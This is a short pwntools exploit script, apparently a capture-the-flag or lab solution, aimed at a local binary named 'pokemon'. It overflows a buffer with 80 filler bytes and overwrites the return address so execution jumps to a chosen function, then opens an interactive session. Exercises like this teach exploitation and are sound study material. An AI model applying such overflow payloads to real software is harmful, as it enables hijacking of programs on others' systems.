#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './pokemon')

# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#function address
call_first = p32(0x80491c6)

buff_overflow = b"A"*80

payload = [buff_overflow, call_first]

io = start([b"".join(payload)])

io.interactive()